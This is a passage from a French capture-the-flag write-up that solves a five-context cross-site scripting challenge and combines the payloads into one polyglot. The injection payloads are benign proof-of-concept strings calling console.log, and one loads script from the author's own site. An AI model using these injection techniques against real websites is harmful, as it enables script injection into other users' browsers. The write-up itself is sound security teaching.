+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>(2) &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;xss&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">`$xss`</span>};&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>devient:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>(2) &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;xss&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">``</span>}; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">2</span>); <span style="color:#960050;background-color:#1e0010">//`};</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>avec le payload: <code> `}; console.log(2); //</code></p>
+<h3 id="xxs-n3-xss-à-lintérieur-de-la-valeur-src">XXS N°3: <em>XSS à l&rsquo;intérieur de la valeur &lsquo;src&rsquo;</em></h3>
+<p>Voici le code html:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>(3) &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$xss&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Deux solutions sont possibles pour le moment:</p>
+<ul>
+<li>utiliser <strong>$xss</strong> pour importer du code js depuis une page externe</li>
+<li>utiliser <strong>data:</strong></li>
+</ul>
+<h4 id="possibilité-1">Possibilité 1:</h4>
+<p>Payload: <code>https://vozec.fr/xss</code><br>
+Sur mon site: <strong>/xss</strong> retourne <code>console.log(3)</code></p>
+<h4 id="possibilité-2">Possibilité 2:</h4>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs" target="_blank">Data doc.</a><br>
+On utilise ce type de payload: <code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code><br>
+Ici, aucun encoding n&rsquo;est requis, de plus <em>text/plain</em> est l&rsquo;encoding par default ce qui nous arrange puisque cela nous évite d&rsquo;entrer un <em>/</em> qui pourrait potentiellement nous déranger pour la suite.</p>
+<p>Payload: <code>data:,a=console.log(3)</code></p>
+<p><em>(C&rsquo;est cette dernière méthode que je retiendrai pour la suite. Elle est plus simple et plus concise.)</em></p>
+<h3 id="xxs-n4-xss-à-lintérieur-de-la-balise-xss">XXS N°4: <em>XSS à l&rsquo;intérieur de la balise &lsquo;&lt;XSS&gt;&rsquo;</em></h3>
+<p>Code HTML</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>(4) &lt;<span style="color:#f92672">XSS</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">xss</span>&gt;
+</span></span></code></pre></div><p>Les règles sont stricts, nous ne pouvons modifier le tag <em>XSS</em> ni le fermer !</p>
+<p>J&rsquo;ai trouvé ici une unique solution pour trigger une XSS dans ce contexte:</p>
+<ul>
+<li>Utiliser les XSS précédente ainsi que l&rsquo;attribut <em>onfocus</em> pour déclencher la XSS</li>
+</ul>
+<p>Voici mon payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">4</span>) <span style="color:#a6e22e">tabindex</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Malheuresement, l&rsquo;attribut <em>autofocus</em> ne foncionne pas ce qui implique l&rsquo;utilisation des précédentes XSS pour trigger celle-ci.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Blocked autofocusing on a &lt;<span style="color:#f92672">xss</span>&gt; element in a cross-origin subframe.
+</span></span></code></pre></div><p>En utilisant la <em>XSS N°1</em>, on peut sélectionner le tag <em>XSS</em> et utiliser la fonction <strong>focus()</strong> de celui ci.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">4</span>) <span style="color:#a6e22e">tabindex</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#a6e22e">wtf</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;img/src/onerror=console.log(1);document.getElementById(String.fromCharCode(120)).focus();&gt;&#39;</span>
+</span></span></code></pre></div><h3 id="xxs-n5-exécuter-un-dom-xss-en-restant-à-lintérieur-de-la-valeur-dentrée">XXS N°5: <em>Exécuter un DOM XSS en restant à l&rsquo;intérieur de la valeur d&rsquo;entrée.</em></h3>
+<p>Voici le code html associé:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>(5) &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;search&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inpt&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$xss&#34;</span>&gt;    
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dom&#34;</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;inpt&#39;</span>).<span style="color:#a6e22e">value</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[DEBUG] (5) =&gt;&#34;</span>, <span style="color:#a6e22e">v</span>)<span style="color:#75715e">//DEBUG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;dom&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;x&#34; alt=&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">v</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Notre payload est d&rsquo;abord inscrit dans <em>value</em> puis celui-ci est récupéré par le code js afin d&rsquo;être inséré dans une balise <em>img</em>.<br>
+Le tricks ici est que notre entrée est évalué une première fois avant d&rsquo;être re-parsé par la suite par le code js.</p>
+<p>Le payload désirée dans la balise <em>img</em> est: <code>&quot;+onerror=console.log(5)+&quot;</code> afin de former:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">console.log(5)+&#34;&#34;</span>&gt;
+</span></span></code></pre></div><p>On peut donc envoyer:</p>
+<ul>
+<li><code>&amp;quot; onerror=console.log(5) &amp;quot;</code><br>
+ou</li>
+<li><code>\&quot; onerror=console.log(5) \&quot;</code><br>
+pour complèter cette dernère XSS.</li>
+</ul>
+<h2 id="partie-2-création-du-payload-polyglotte">Partie 2) Création du payload polyglotte:</h2>
+<p>On va ici partir du payload le plus compliqué et le moins permissif dans son contexte puis on va petit à petit lui ajouter les autres un par un.</p>
+<p>Les 2 premiers sont trés facilement plaçable, de même le dernier peut facilement être en fin de payload, nous nous en occuperons à la fin.</p>
+<p>Le plus compliqué est de faire fonctionner le 2ème et le 3ème ensemble:</p>
+<h4 id="explication">Explication:</h4>
+<p>Le payload doit obligatoirement commencer par <code>data:</code>, en effet c&rsquo;est l&rsquo;unique syntaxe qui permet de charger du javascript sans faire de requètes dans le paramètre <strong>src</strong> de la balise <strong>script</strong>.</p>
+<p>De plus, la <em>XSS 4</em> impose d&rsquo;avoir une suite chaines de caractères de la forme:
+<code>clef=valeure</code> <em>(attribut de la balise &lt;XSS&gt;)</em></p>
+<p>J&rsquo;ai donc utilisé la 2ème solution présenté précédemment pour la *XSS 3 et ** pour former:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>data:,a=console.log(3)// id=x onfocus=console.log(4) tabindex=1
+</span></span></code></pre></div><ul>
+<li>
+<p>Le contexte de la <em>XSS 3</em> interprète ce payload comme :<br>
+<code>data:,</code> + <code>a=console.log(3)</code> + <code>//</code> + <em>(commentaire)</em><br>
+La balice <em>&lt;script&gt;</em> charge donc <em>a=console.log(3)</em></p>
+</li>
+<li>
+<p>Le contexte de la <em>XSS 4</em> interprète ce payload comme :<br>
+(<code>data:,a=</code> + <code>console.log(3)//</code>) + (<code>id</code> = <code>...</code>)<br>
+Ici <em>data:,a</em> est la clef et <em>console.log(3)//</em> la valeure.</p>
+</li>
+</ul>
+<h3 id="ajout-de-la-xss-1-et-2">Ajout de la <em>XSS 1 et 2</em></h3>
+<p>Toujours avec les mêmes restrictions du contexte de la balise <em><!-- raw HTML omitted --></em>, nous pouvons ajouter un attribut custom avec le code des 2 premières XSS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">vozec</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;`}; console.log(2); //&lt;img/src/onerror=console.log(1);&gt;&#39;</span>
+</span></span></code></pre></div><h3 id="ajout-de-la-xss-5">Ajout de la <em>XSS 5</em></h3>
+<p>On termine avec la deuxième option évoquée:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">quot</span>; <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">5</span>) <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">quot</span>;
+</span></span></code></pre></div><h3 id="focus-sur-le-tag-xss">Focus sur le tag <em><!-- raw HTML omitted --></em></h3>
+<p>Pour activer la 4ème xss, il est nécessaire de déclencher le handler <em>onfocus</em>.<br>
+On peut donc utiliser la 5ème XSS pour me réaliser.
+On rajoute: <code>document.getElementById(String.fromCharCode(120)).focus();</code></p>
+<h1 id="payload-finale">Payload Finale:</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">data</span><span style="color:#f92672">:</span>,<span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">3</span>)<span style="color:#75715e">// id=x onfocus=console.log(4) tabindex=1 vozec=&#39;`}; console.log(2); //&lt;img/src/onerror=console.log(1);&gt;&#39;&amp;quot; onerror=console.log(5);document.getElementById(String.fromCharCode(120)).focus(); &amp;quot;
+</span></span></span></code></pre></div><h1 id="upgrade">Upgrade:</h1>
+<p>J&rsquo;ai par la suite upgrade ma payload de la sorte:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">data</span><span style="color:#f92672">:</span>,<span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">3</span>)<span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;console.log(4)//&lt;body onload=document.getElementById((false+String)[0]).focus();console.log(1);&gt;`}; console.log(2);//&#39;</span><span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">f</span> <span style="color:#a6e22e">tabindex</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">quot</span>; <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">5</span>);<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">quot</span>;
+</span></span></code></pre></div><p><img src="./img/poc.png" alt="Alt text"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/like_a_whispering_entropy-pwnme-2023/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Like a Whispering Entropy | PWNME CTF 2023</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/?ref=footer"><span style="font-weight:bold;">Next »</span><br>ChatterBox | RealWorld CTF 6th</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hint">/Hint</a></li>
+    <li><a href="#-rules">/ Rules</a></li>
+    <li><a href="#goal">/GOAL</a></li>
+    <li><a href="#source-code">/Source Code</a></li>
+    <li><a href="#première-approche">Première approche:</a></li>
+    <li><a href="#partie-1-résolution-des-xss-séparement">Partie 1) Résolution des XSS séparement:</a>
+      <ul>
+        <li><a href="#xxs-n1-xss-classique-par-lutilisation-de-balises-html">XXS N°1: <em>XSS classique par l&rsquo;utilisation de balises HTML</em></a></li>
+        <li><a href="#xxs-n2-xss-en-restant-à-lintérieur-des-balises-script-dorigine">XXS N°2: <em>XSS en restant à l&rsquo;intérieur des balises &lt;script&gt; d&rsquo;origine</em></a></li>
+        <li><a href="#xxs-n3-xss-à-lintérieur-de-la-valeur-src">XXS N°3: <em>XSS à l&rsquo;intérieur de la valeur &lsquo;src&rsquo;</em></a></li>
+        <li><a href="#xxs-n4-xss-à-lintérieur-de-la-balise-xss">XXS N°4: <em>XSS à l&rsquo;intérieur de la balise &lsquo;&lt;XSS&gt;&rsquo;</em></a></li>
+        <li><a href="#xxs-n5-exécuter-un-dom-xss-en-restant-à-lintérieur-de-la-valeur-dentrée">XXS N°5: <em>Exécuter un DOM XSS en restant à l&rsquo;intérieur de la valeur d&rsquo;entrée.</em></a></li>
+      </ul>
+    </li>
+    <li><a href="#partie-2-création-du-payload-polyglotte">Partie 2) Création du payload polyglotte:</a>
+      <ul>
+        <li></li>
+        <li><a href="#ajout-de-la-xss-1-et-2">Ajout de la <em>XSS 1 et 2</em></a></li>
+        <li><a href="#ajout-de-la-xss-5">Ajout de la <em>XSS 5</em></a></li>
+        <li><a href="#focus-sur-le-tag-xss">Focus sur le tag <em><!-- raw HTML omitted --></em></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
